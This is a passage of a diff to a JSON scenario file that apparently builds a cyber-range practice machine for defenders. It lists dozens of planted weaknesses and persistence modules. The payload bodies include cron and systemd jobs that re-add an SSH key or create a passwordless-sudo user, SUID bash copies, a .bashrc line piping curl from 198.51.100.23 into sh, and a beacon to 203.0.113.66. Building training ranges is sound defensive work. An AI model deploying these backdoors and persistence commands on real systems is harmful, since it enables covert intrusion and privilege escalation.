+            "FILE_PATH": "/var/tmp/bluekit/harden.sh",
+            "CONTENT": "#!/bin/sh\n# stale blue response kit marker",
+            "MODE": "0755"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/var/tmp/bluekit/linpeas.sh",
+            "CONTENT": "stale blue kit marker"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/var/tmp/bluekit/busybox",
+            "CONTENT": "stale blue kit marker"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/var/tmp/bluekit/dc-evidence/dc-addendum-excerpt.md",
+            "CONTENT": "Seized DC evidence excerpt (WR#2 addendum):\n- 4729/4737: 'Speedy Gonzales' and 'Marvin Martian' added to Domain Admins 3 minutes into the window.\n- 5001: Defender real-time protection disabled on the DC.\n- 4104: DSInternals imported twice, disguised as a module named DNSCache (Get-ADDBAccount / Get-ADReplAccount = ntds/SYSTEM theft)."
+          }
+        },
+        {
+          "name": "sshd-config-weak",
+          "vars": {}
+        },
+        {
+          "name": "ssh-root-login",
+          "vars": {}
+        },
+        {
+          "name": "ssh-password-auth",
+          "vars": {}
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "root",
+            "PASSWORD": "Acm3Upd4t3!"
+          }
+        },
+        {
+          "name": "root-password-backdated",
+          "vars": {
+            "PASSWORD": "Acm3Upd4t3!"
+          }
+        },
+        {
+          "name": "sshd-dropin",
+          "vars": {
+            "DROPIN_NAME": "98-acme-admin.conf",
+            "LINES": "AllowUsers acmeadmin ubuntu root"
+          }
+        },
+        {
+          "name": "ssh-backdoor-listener-2222",
+          "vars": {}
+        },
+        {
+          "name": "unauthorized-ssh-backup-listener",
+          "vars": {
+            "PORT": "1337"
+          }
+        },
+        {
+          "name": "ufw-insecure",
+          "vars": {
+            "ROGUE_PORT": "31337"
+          }
+        },
+        {
+          "name": "sssd-realm-offline",
+          "vars": {
+            "DOMAIN": "ACME.ANVIL",
+            "REALM": "acme.anvil",
+            "DC_NAME": "dc01.acme.anvil"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/var/lib/sss/db/cache_acme.anvil.ldb",
+            "CONTENT": "cached-credentials marker (practice)",
+            "MODE": "0600"
+          }
+        },
+        {
+          "name": "sudoers-dropin-world-admins",
+          "vars": {}
+        },
+        {
+          "name": "shared-hash-accounts",
+          "vars": {
+            "COUNT": "8",
+            "PREFIX": "svc",
+            "HASH": "$6$Mg3j3L4zsboSN1du$Ce6LDkLUCrVX63xGWsWd9zMBCfRf170l7dg6.Om9usPlQ9N3/g..Yliz/afNFz7pmdcg.2cq7USfCyGXbhuYI/"
+          }
+        },
+        {
+          "name": "weak-login-defs",
+          "vars": {
+            "PASS_MAX_DAYS": "99999",
+            "ENCRYPT_METHOD": "MD5"
+          }
+        },
+        {
+          "name": "passwd-inline-hash",
+          "vars": {
+            "USERNAME": "webmail",
+            "HASH": "wGqpOl2Em1uv6"
+          }
+        },
+        {
+          "name": "pam-no-password-quality",
+          "vars": {}
+        },
+        {
+          "name": "service-account-shell",
+          "vars": {}
+        },
+        {
+          "name": "plaintext-vault-token",
+          "vars": {
+            "FILE_PATH": "/root/.vault-token",
+            "LISTEN_ADDR": "0.0.0.0:8200",
+            "SERVICE_NAME": "vault"
+          }
+        },
+        {
+          "name": "mongodb-stub-noauth",
+          "vars": {
+            "FILE_PATH": "/etc/mongod.conf",
+            "LISTEN_ADDR": "0.0.0.0:27017",
+            "SERVICE_NAME": "mongod"
+          }
+        },
+        {
+          "name": "mysql-remote-root",
+          "vars": {}
+        },
+        {
+          "name": "mysql-root-hash-reuse",
+          "vars": {}
+        },
+        {
+          "name": "secrets-in-webroot-env",
+          "vars": {}
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/root/.mysql_history",
+            "CONTENT": "mysql -u root -p'BeepBeep1!' -e 'select 1';\n"
+          }
+        },
+        {
+          "name": "php-webshell-webroot",
+          "vars": {}
+        },
+        {
+          "name": "apache-anon-upload-rce",
+          "vars": {}
+        },
+        {
+          "name": "apache-insecure",
+          "vars": {
+            "ALIAS_NAME": "vault"
+          }
+        },
+        {
+          "name": "cockpit-installed",
+          "vars": {}
+        },
+        {
+          "name": "docker-group-member",
+          "vars": {
+            "USERNAME": "acmeadmin"
+          }
+        },
+        {
+          "name": "docker-privileged-container",
+          "vars": {}
+        },
+        {
+          "name": "x11vnc-root-nopassword",
+          "vars": {}
+        },
+        {
+          "name": "ttyd-web-terminal",
+          "vars": {
+            "PORT": "7681"
+          }
+        },
+        {
+          "name": "git-daemon-secrets-repo",
+          "vars": {}
+        },
+        {
+          "name": "suid-binary",
+          "vars": {
+            "DEST": "/usr/lib/.acme-health",
+            "SRC": "/bin/bash"
+          }
+        },
+        {
+          "name": "nologin-swap",
+          "vars": {}
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "bluey",
+            "PASSWORD": ""
+          }
+        },
+        {
+          "name": "user-sudo-nopasswd",
+          "vars": {
+            "USERNAME": "bluey"
+          }
+        },
+        {
+          "name": "passwordless-sudo",
+          "vars": {}
+        },
+        {
+          "name": "cron-d-persistence",
+          "vars": {
+            "CRON_FILE": "backup",
+            "SCHEDULE": "* * * * *",
+            "PAYLOAD_PATH": "/opt/scripts/backup.sh",
+            "PAYLOAD_BODY": "tar czf /var/backups/home-$(date +%F).tar.gz /home"
+          }
+        },
+        {
+          "name": "exploitable-cron-job",
+          "vars": {}
+        },
+        {
+          "name": "world-writable-dir",
+          "vars": {
+            "DIR": "/opt/acme-data",
+            "MODE": "0777"
+          }
+        },
+        {
+          "name": "file-capability",
+          "vars": {
+            "DEST": "/usr/bin/python3.acme",
+            "CAP": "cap_setuid+ep"
+          }
+        },
+        {
+          "name": "polkit-passwordless-root-rule",
+          "vars": {}
+        },
+        {
+          "name": "rhosts-trust",
+          "vars": {
+            "TARGET": "/root/.rhosts",
+            "CONTENT": "+ +"
+          }
+        },
+        {
+          "name": "hosts-redirect-linux",
+          "vars": {
+            "IP": "198.51.100.23",
+            "HOSTS": "updates.acme.anvil vault.acme.anvil"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/root/binaries/linpeas.sh",
+            "CONTENT": "toolkit marker",
+            "MODE": "0755"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/root/binaries/busybox",
+            "CONTENT": "toolkit marker",
+            "MODE": "0755"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/root/binaries/tmux",
+            "CONTENT": "toolkit marker",
+            "MODE": "0755"
+          }
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/root/binaries/sdiff",
+            "CONTENT": "toolkit marker",
+            "MODE": "0755"
+          }
+        },
+        {
+          "name": "wildcard-sudo",
+          "vars": {}
+        },
+        {
+          "name": "sudoers-gtfobins-allowlist",
+          "vars": {}
+        },
+        {
+          "name": "authorized-keys-persistence",
+          "vars": {
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBZvvJciZxWmGyajxBrNaQ4TVmvFKd89hQXscgsBJNUE updater@acme.anvil",
+            "USERNAME": "root"
+          }
+        },
+        {
+          "name": "crontab-persistence",
+          "vars": {
+            "USERNAME": "root",
+            "SCHEDULE": "*/15 * * * *",
+            "JOB_COMMAND": "/usr/local/sbin/acme-key-redrop",
+            "PAYLOAD_PATH": "/usr/local/sbin/acme-key-redrop",
+            "PAYLOAD_BODY": "grep -q 'updater@acme.anvil' /root/.ssh/authorized_keys || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBZvvJciZxWmGyajxBrNaQ4TVmvFKd89hQXscgsBJNUE updater@acme.anvil' >> /root/.ssh/authorized_keys"
+          }
+        },
+        {
+          "name": "cron-d-persistence",
+          "vars": {
+            "CRON_FILE": "logrotate-check",
+            "SCHEDULE": "* * * * *",
+            "PAYLOAD_PATH": "/usr/local/sbin/logrotate-check",
+            "PAYLOAD_BODY": "chmod u+s /bin/sh; passwd -u -d root"
+          }
+        },
+        {
+          "name": "systemd-timer-persistence",
+          "vars": {
+            "TIMER_NAME": "acme-health",
+            "EXEC_START": "/usr/local/sbin/acme-health",
+            "PAYLOAD_PATH": "/usr/local/sbin/acme-health",
+            "PAYLOAD_BODY": "#!/bin/sh\nid svc-update >/dev/null 2>&1 || useradd -r -m -s /bin/bash svc-update\nprintf 'svc-update ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/svc-update\ngrep -q 'updater@acme.anvil' /root/.ssh/authorized_keys || true",
+            "ON_UNIT_ACTIVE_SEC": "15min"
+          }
+        },
+        {
+          "name": "cron-watchdog-reinstaller",
+          "vars": {}
+        },
+        {
+          "name": "file-drop",
+          "vars": {
+            "FILE_PATH": "/opt/.svc/.cache/svc-daemon",
+            "CONTENT": "# watchdog marker (restored by root cron)"
+          }
+        },
+        {
+          "name": "priv-user-respawn-service",
+          "vars": {
+            "USERNAME": "svc_monitor",
+            "PASSWORD": "svc_monitor"
+          }
+        },
+        {
+          "name": "rc-local-persistence",
+          "vars": {
+            "RC_LINE": "/usr/local/sbin/acme-replant",
+            "PAYLOAD_PATH": "/usr/local/sbin/acme-replant",
+            "PAYLOAD_BODY": "cp /bin/bash /usr/lib/.acme-health && chmod 4755 /usr/lib/.acme-health"
+          }
+        },
+        {
+          "name": "apt-post-invoke-persistence",
+          "vars": {
+            "FILE_PATH": "/etc/apt/apt.conf.d/99-acme-health",
+            "PAYLOAD_PATH": "/usr/local/lib/apt/acme-health-hook.sh"
+          }
+        },
+        {
+          "name": "sshd-authkeyscommand-backdoor",
+          "vars": {
+            "FILE_PATH": "/usr/lib/openssh/acme-auth",
+            "KEY_STORE": "/etc/ssh/.ssh/authorized_keys",
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBZvvJciZxWmGyajxBrNaQ4TVmvFKd89hQXscgsBJNUE updater@acme.anvil"
+          }
+        },
+        {
+          "name": "profiled-persistence",
+          "vars": {
+            "FILE_NAME": "acme-session.sh",
+            "SNIPPET": "grep -q 'acme-key-redrop' /var/spool/cron/crontabs/root || echo '*/15 * * * * root /usr/local/sbin/acme-key-redrop' | crontab -u root -"
+          }
+        },
+        {
+          "name": "bashrc-persistence",
+          "vars": {
+            "TARGET_FILE": "/root/.bashrc",
+            "SNIPPET": "curl -s http://198.51.100.23/x | sh # acme sync"
+          }
+        },
+        {
+          "name": "at-job-persistence",
+          "vars": {
+            "PAYLOAD_PATH": "/usr/local/sbin/acme-at-replant",
+            "PAYLOAD_BODY": "cp /bin/bash /usr/lib/.acme-health && chmod 4755 /usr/lib/.acme-health"
+          }
+        },
+        {
+          "name": "journald-vacuum-cron",
+          "vars": {
+            "CRON_NAME": "journal-maintenance"
+          }
+        },
+        {
+          "name": "cron-log-truncator",
+          "vars": {}
+        },
+        {
+          "name": "journal-disk-full",
+          "vars": {}
+        },
+        {
+          "name": "mask-services",
+          "vars": {
+            "SERVICES": "nginx postfix dovecot vsftpd tftpd-hpa apache2 mariadb mysql avahi-daemon cups bluetooth ModemManager rpcbind"
+          }
+        },
+        {
+          "name": "xattr-payload-helper",
+          "vars": {
+            "XATTR_NAME": "user.sync_blob",
+            "HOSTS_FILE": "/etc/hosts"
+          }
+        },
+        {
+          "name": "carrier-elf-section-marker",
+          "vars": {
+            "CARRIER_PATH": "/usr/local/bin/.logrotate-check"
+          }
+        },
+        {
+          "name": "udev-rule-persistence",
+          "vars": {}
+        },
+        {
+          "name": "fake-ntpd-rogue-unit",
+          "vars": {}
+        },
+        {
+          "name": "realm-beacon",
+          "vars": {
+            "SERVICE_NAME": "acme-health-check",
+            "BEACON_PATH": "/opt/tide-sync/tide-syncd",
+            "TARGET_IP": "203.0.113.66",
+            "TARGET_PORT": "443",
+            "DESCRIPTION": "System health beacon"
+          }
+        },
+        {
+          "name": "port-knock-hidden-service",
+          "vars": {
+            "KNOCK_PORTS": "1599,1601,1603",
+            "SHELL_PORT": "4422"
+          }
+        },
+        {
+          "name": "world-writable-cron-d",
+          "vars": {}
+        },
+        {
+          "name": "cron-d-rogue-job",
+          "vars": {}
+        },
+        {
+          "name": "firewall-flush-refire",
+          "vars": {}
+        },
+        {
+          "name": "raw-socket-beacon",
+          "vars": {
+            "SERVICE_NAME": "kswap-syncd",
+            "DESCRIPTION": "Kernel swap cache daemon"
+          }
+        },
+        {
+          "name": "hidden-cron-persistence",
+          "vars": {}
+        },
+        {
+          "name": "fake-false-homoglyph-shell",
+          "vars": {}
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "ubuntu",
+            "PASSWORD": "R4ng3Ubuntu!9"
+          }
+        },
+        {
+          "name": "attacker-authorized-keys",
+          "vars": {
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEkXegB62CxS8LdEJfDdhFa5fAqfMhkGbTqf2RddZzUyx cyberrange-lab",
+            "USERNAME": "ubuntu"
+          }
+        },
+        {
+          "name": "crontab-persistence",
+          "vars": {
+            "USERNAME": "root",
+            "SCHEDULE": "*/10 * * * *",
+            "JOB_COMMAND": "/usr/local/sbin/tide-sync-relay",
+            "PAYLOAD_PATH": "/usr/local/sbin/tide-sync-relay",
+            "PAYLOAD_BODY": "/usr/bin/env /opt/tide-sync/tide-syncd --recheck >/dev/null 2>&1\n"
+          }
+        },
+        {
+          "name": "proc-overmount-process-hider",
+          "vars": {}
+        }
+      ]
+    }
+  ]
+}
